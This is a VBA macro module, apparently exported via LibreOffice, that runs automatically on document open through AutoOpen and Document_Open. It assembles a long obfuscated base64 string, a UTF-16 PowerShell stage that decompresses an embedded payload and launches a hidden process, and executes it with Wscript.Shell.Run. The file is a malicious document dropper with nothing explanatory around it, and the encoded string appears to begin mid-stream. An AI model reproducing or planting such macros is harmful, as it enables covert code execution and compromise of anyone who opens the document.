#Rem Attribute VBA_ModuleType=VBAModule
#Option VBASupport 1
#The above 2 line is auto generated by
#Libre Office
Sub AutoOpen()

    GreatMacro
 
End Sub


Sub Document_Open()

    GreatMacro

End Sub

Sub GreatMacro()
'
' GreatMacro Macro
'
'
    Dim Str As String
    Str = Str + "nAHQAYgAzAHIAbgBiAFIAbgBDAFIASABiAE0AKwBQAHgATQA4A"
    Str = Str + "C8ATQAyAEUAOQBDAGwAeABNAFcAUwBwADcAaAB7ADIAfQB0AGY"
    Str = Str + "AUwB0AHcAKwAvAFMATwBuAG8AbwBRAGcAdABKAFMAVQBYAGwAU"
    Str = Str + "ABOAFMANwBuAEcAaABQAHUALwBrAC8ATAAzADAAUgB7ADIAfQB"
    Str = Str + "JAG0AMgBtAHAAewAyAH0AWgAwAHQARQB3AHUAbgB7ADIAfQB7A"
    Str = Str + "DIAfQBTADIASgBJAGgAegB5ADQANwB6AFEAdwBsAHkATABZADc"
    Str = Str + "AeAA4AG8AQQBUAEgAaQBpAHIAOQBJAFEAMABEAEgATwBHAHoAM"
    Str = Str + "gA0AHsAMQB9ADUAZAByAG4AMABUAHsAMQB9AHIAOQBYAG0AaAB"
    Str = Str + "SADkAbwBCAG8ASwByAGEAcgBJAFQAZgBBADAAcABrAFcAZQBtA"
    Str = Str + "EsAdgB5ADEAdwBrAHYAQwBwAFkASwAwAHEANABJACcAJwArACc"
    Str = Str + "AJwBuAC8AOQBLAHEAdQBUAHMALwBLADAAMABIAGgATQBFAEkAM"
    Str = Str + "AB7ADIAfQAyAGQAcgBGAEgAQwA4AEwASABxAFcAeQBLAG4AMQB"
    Str = Str + "YAHgAWQBGADMAdQB4AHsAMgB9AFcAWgBKAE8ANABFAFkAdQBaA"
    Str = Str + "HoAdwB0AEQARQBwADUAWABDAG4AWQBZAEkAeAAvAGYAZwBMAFU"
    Str = Str + "AMQBOAGoARQBQAG0AQgBmAEwAewAxAH0ASgBYAG4AeQAwAFMAW"
    Str = Str + "QBKADEARQBvADcAaQBTAE0ASABFAFUAVQBHAFQANQA3AEUAWAB"
    Str = Str + "NADEAegA0AHQAdwBIAE0AdAA1AGEAUwBMAE0AVAA2AGIAVAAzA"
    Str = Str + "DUAUgBKAGUAdgBZAGcAQwBUAGwAWgA0AG8ASQBSAHsAMQB9AGg"
    Str = Str + "AeQB4AGwAWQBXAGoATgBYAEYAeABYAEcAaQBqADAASwBOADQAZ"
    Str = Str + "wBQADAAcABhAEYAawA4AEkAdQBGAHMAcQBxAG8AZwB0AG0AWQB"
    Str = Str + "MAHIATwBUAEMAaABOAEsAOAA5AEcALwBNAEsARABkADQAawB5A"
    Str = Str + "EgAMwBYAGkAWABsAHsAMgB9AEEAbQBrAGUAagB4AFMAOAB4AEQ"
    Str = Str + "ATQBGADcAewAxAH0AMABtAFoAZABRAGYATgBTAFQAWAAzACcAJ"
    Str = Str + "wArACcAJwBFAFQAdwBxAC8AQwBPAEYASQBBAGcAUABzAHUAcwB"
    Str = Str + "QAE0AegAwAGkAUQBXAGUAWQAnACcAKwAnACcAVQB5AHoAdwB2A"
    Str = Str + "FoAbQBCAHgAMgBNAEQAaQByADkARgBoAE0ARAByAHAAZgBwAEY"
    Str = Str + "ASgBlAE0AdQBGAGcAeABGAG0AMABnADIAbgB1AEwAawBxAHcAT"
    Str = Str + "wBuADIAQwBXAHMAcgB0AHUAcQB2AGcATwB2ADkAZQB7ADEAfQA"
    Str = Str + "rAHsAMgB9AE0ARgB6AFQAbgBhADEAaQBZAE8ASQB4ADQAMAAyA"
    Str = Str + "GYAMQBIACsASwBlAEMAMwBnAGoARQBrAEoAdgBzADcAaQBPAGY"
    Str = Str + "AUgBMAGkAKwBpADUARQBTACsASgBtAFIARgB7ADIAfQBlAEMAd"
    Str = Str + "wBmADIASwBUADQAZwBVAHMAagBFAGIAcwBBAC8AUgBVADQAMwB"
    Str = Str + "zAEYAZgBIAEYATQA4AFEARgB4AEEATAB7ADIAfQByAHgAUQBhA"
    Str = Str + "HkAdwBKAGYAOQBMAHsAMgB9AEUAMABJADkASABHAGsAdQBoAEQ"
    Str = Str + "AUQBHAHIAeQBEAGEANgBvAC8ATwBIAEsATwBtAHkARQBaAG8AN"
    Str = Str + "ABpAFcAZwBkADUAdwBEAFQAWABNACsAcABBAGYATwBwAE4ATwB"
    Str = Str + "VADIARwBXAG4AaQB6AGsASQB5AFQAVwBLADQAagBnAHYAOQBSA"
    Str = Str + "EwASQBUAHoAewAxAH0AdgBXAFIAaABSADcAJwAnACsAJwAnAE8"
    Str = Str + "AVQBsAEwAWQB4AEoAdQBxAFUAbABuAEIAMAArADUAVwBkADMAe"
    Str = Str + "gBZAFIAeQA0AHEASwBZAFoAKwBhAG0ANgBsAC8AZwBUAEkAKwB"
    Str = Str + "0AHMAVABEAG0AVQBlAEoAQwBYAEEARwBDAE8AMgB1AEYAWABZA"
    Str = Str + "EsAbwBRAEMAUQB2AHQAWQBtAEgAJwAnACsAJwAnADkAWgAxAEY"
    Str = Str + "AWgB0AG4AJwAnACsAJwAnAHgAOABxAHQANAAxAEIAQwBsAGsAR"
    Str = Str + "ABoAGcAYQBRADMAeABnAEIAVwBCAGcAOABVAEYAVwB5AEwAdwA"
    Str = Str + "5AE0AZwBNAHQAVwBCAGgAYgBpAHgAWABGAEMAOQBCADYARgBBA"
    Str = Str + "HcAbQBoAFQATgBvAEQAeQBrACsAWABIAGcARgA1AHAAaABUADM"
    Str = Str + "ANwBEADAAeQB3AFIAagBxAHcAWAAwAEcAUwBZAG4AUABnAEoAO"
    Str = Str + "ABiAFkAbwA0ADMAbgBKAEkAUgBHAEgAOABpAE4AZwBuAHEALwA"
    Str = Str + "vAG0AeABNAHYANgA4ADcAQgBtADEAcQBFADAALwBBAG8AVwBZA"
    Str = Str + "DUATgA5AEIAMAAnACcAKwAnACcAWABXAFoARABiACcAJwArACc"
    Str = Str + "AJwB6AHUAMQBIAHcAZABNAFUAcABBAE0AawBFAFEAewAxAH0AN"
    Str = Str + "ABtACcAJwArACcAJwBoAEYAYgA2AGkAagBHAG4ANgByAEgASwB"
    Str = Str + "xAE4AOABMAE4ANgBTAG0AZwBaAGoAWgBJAFQAVQBkAFAAVQBGA"
    Str = Str + "EsAVwBzAGIAVQBqAFoATQArAE4AbgBrADMARwBEADEAQwArACs"
    Str = Str + "ANgBNADIAOABYAG8ALwBvADIAOABEAFUAagBOAHMAeAAyAHIAO"
    Str = Str + "QA1AHYAdAA2AHYAcgBqAHUAewAyAH0AVQB1AGQAVQB3ACsASAB"
    Str = Str + "YAFAANABHAGIAagBmAGoANgAzAHQAUABiAEEASAB2AEcAeABvA"
    Str = Str + "GIAWAB2AFMARwBrAHgAcQB1ADUAWABIAGIASwAzAHUAcABvADM"
    Str = Str + "AMgAnACcAKwAnACcAaABZAC8ANwBmAFgAOQBwAHEAUgB2ADkAL"
    Str = Str + "wBPAFoANQA0AC8AcQB2AGoAKwA3ADgASwAxAEIAKwBkAHsAMQB"
    Str = Str + "9AG0ANgBRADUAcgBmAGIAMQBVAFEAZAAxADYASQArAGsATwA5A"
    Str = Str + "FkAMQBlAHEAcwBZAE4AcwBtAG4AMwBpAGQAMQBmAGQASgByADg"
    Str = Str + "AWQBlAFIAUQBaAFAAdgBGADIAWAAzADUARQBwAEYAdABOADUAb"
    Str = Str + "wA3AFoAVwBiAHUARABVADEAcgBCAGUAZgB1AHYAdQBNADcAcgB"
    Str = Str + "7ADEAfQBEADAAZABxAE4AMgA4AFgASgBZAFgAVwBnAE4AVABhA"
    Str = Str + "HUARgBEAGEAZQBwAHMAKwB1AFIASABtAG0AOQAnACcAKwAnACc"
    Str = Str + "AbwBtAE0AMwA5AGIANwBkADAAUAB0ADkAVwBQAHMAMABLAC8Ac"
    Str = Str + "AB7ADIAfQBXAEsATQB7ADIAfQAxAGsAUgBtAGoAWABuAHsAMgB"
    Str = Str + "9AEwAZABOAG0AMgB1AEQAZQBDAEoAewAxACcAJwArACcAJwB9A"
    Str = Str + "G8AMABJAGQATwBoAFkAeABYADkANABNAEEAYgBEAFgAQgBCAGI"
    Str = Str + "ATgBZAHEAaABvAGUAMwByAEwAUAAzAFMARgB4ADEAawBVAEgAd"
    Str = Str + "ABXADcANABXAEsAdAAxAHEAbQBYAHYAMwB0AG0AMwBLAHkAagB"
    Str = Str + "vAGoASgAyAGsAZQB6AG0ATwB2AFUAJwAnACsAJwAnAGEAbgB2A"
    Str = Str + "HQARwAxAFUAYgBuAFIAMABlAHMAdAByAFQARwB3ADcAZQBaADQ"
    Str = Str + "ANgBDAHoARwB3AHoAcwA2AEgAdAByAGwATQB7ADEAfQBQAHUAc"
    Str = Str + "ABoAGkAQQBEAFkATAAxAFcAMgBmAHgAVQBEAFIAYgBNAHkAUAB"
    Str = Str + "ZAGwAbQBkAHcAMQBrAHsAMgB9AHsAMgB9AEwAegAzAFcAbABtA"
    Str = Str + "FIASgBIAHkAcABlADgAZABMACsAcgBJAGUAYgA2ADEAbAB2AFA"
    Str = Str + "AZgBQADYAdwA0AHYAQgA5AG0AYgAzAFUARwBHAGEAWABTAHcAN"
    Str = Str + "gBIAHkASABZAEUANQAnACcAKwAnACcAdQBFAC8ATAB3AHkAegB"
    Str = Str + "hADMAbQBvAHEAdQBXAFAAdgB5AFMAJwAnACsAJwAnADgAKwBlA"
    Str = Str + "GYANwAwADgAaQAvAGwAYQB4AE4AMQBFAFUAQgA0AGcAQwBFADY"
    Str = Str + "AQwBPAFoAegBuAFoAWgBGAEUAegByAHsAMQB9ADQAOQBSAG8AU"
    Str = Str + "wBHAG8AaAB4AGIAKwB3AEoASABJAGEAYgBRAEUAcQBGAHAAWgB"
    Str = Str + "sAFQAVwBLAEcAVwB1AGEAQQB5AGkAawBFAE4AUABPAG4AWQBLA"
    Str = Str + "DAAYgBoAHMANAArAEQAewAyAH0AYQAxACsAcQA5AEMAUwBvAFA"
    Str = Str + "AbgBlAE0AYgBPAG4AcQBhAGcAeABlAFEAbgBZAEkAMwBoAGEAN"
    Str = Str + "gBPAEoAegB4AEkARgAvAGEAbgBwAGQASwBVAE8ANQBMADIAMQB"
    Str = Str + "MADEAawBBAFgAdgB2ADEAdQBOAHIAWABiAEsAdwB7ADIAfQBoA"
    Str = Str + "GUATgBJAHcARABPAEoAbAAxAGUAcgBBAE8AQgBvAGsAdgBLAHs"
    Str = Str + "AMQB9AHIALwBnAEIAZQA4AEMAVABoACcAJwArACcAJwBVAHEAR"
    Str = Str + "AB7ADEAfQBSAGUAdwBzADgATwBIAHMAQgA1AFEAUQBLADMARAB"
    Str = Str + "IAEgAQgBZAFEANgBZAC8AUQBVAHcAUAAnACcAKwAnACcAUgBtA"
    Str = Str + "FQAMwB3ADQAeABRACsAQQBLADgAUABsAEoAKwBJADUASQBJAGc"
    Str = Str + "AQwBCAHMANwB3AG8ANQBUAGoAbwBtAE8AZQBkAHUAQgB7ADEAf"
    Str = Str + "QAwAHUAbgA4AFoATwBxAGsAdABTAHEAQQBQACsAOABmAHEAUAB"
    Str = Str + "PADgAOQBqAGUANwA3ADYASgBUAEsAWAArAEUANQA4AFgAeQBqA"
    Str = Str + "HcAcwBuAFoAZgA1AG4AUQBqAEIARQBoAEkATwBvAEIAVQBXAFg"
    Str = Str + "ANAB1AE4AVAA0AEYAVQBrADAAbgB3ADUAaQBUAEcARQBCADUAT"
    Str = Str + "ABCAFQANABkADQARwBOADgAbQAvAE8AdwAnACcAKwAnACcARwB"
    Str = Str + "IAGwAdQBIAHMAdgA4AG4AbABVAFAAVQBGAFkANABMAEEAQQBBA"
    Str = Str + "HsAMAB9ACcAJwApAC0AZgAnACcAPQAnACcALAAnACcAYwAnACc"
    Str = Str + "ALAAnACcAVgAnACcAKQApACkAKQAsAFsAUwB5AHMAdABlAG0AL"
    Str = Str + "gBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQB"
    Str = Str + "wAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvA"
    Str = Str + "G0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQ"
    Str = Str + "AKAApACkAKQAnADsAJABzAC4AVQBzAGUAUwBoAGUAbABsAEUAe"
    Str = Str + "ABlAGMAdQB0AGUAPQAkAGYAYQBsAHMAZQA7ACQAcwAuAFIAZQB"
    Str = Str + "kAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1A"
    Str = Str + "HQAPQAkAHQAcgB1AGUAOwAkAHMALgBXAGkAbgBkAG8AdwBTAHQ"
    Str = Str + "AeQBsAGUAPQAnAEgAaQBkAGQAZQBuACcAOwAkAHMALgBDAHIAZ"
    Str = Str + "QBhAHQAZQBOAG8AVwBpAG4AZABvAHcAPQAkAHQAcgB1AGUAOwA"
    Str = Str + "kAHAAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0A"
    Str = Str + "GkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQ"
    Str = Str + "AKAAkAHMAKQA7AA=="

    CreateObject("Wscript.Shell").Run Str
End Sub

